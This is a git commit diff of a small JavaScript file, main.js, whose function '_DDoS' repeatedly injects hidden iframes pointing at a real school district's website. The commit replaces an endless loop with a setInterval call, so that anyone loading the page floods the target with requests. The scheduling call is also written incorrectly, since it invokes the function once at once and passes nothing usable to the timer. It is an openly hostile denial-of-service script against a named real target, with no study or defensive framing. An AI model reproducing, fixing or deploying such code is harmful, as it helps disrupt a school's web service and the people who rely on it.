d9d8ff14b0aa8e1ebc6d2b30e8b9ae2bd4c14b68
ninja25538 <ninja25538@users.noreply.github.com>
2017-05-15 17:29:17 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,7 +1,6 @@
 function _DDoS(url){
  document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
 }
-for(;;){
- setTimeout(_DDoS("http://www.mvcsc.k12.in.us"),10);
-}
+ setInterval(_DDoS("http://www.mvcsc.k12.in.us"),10);
+
 
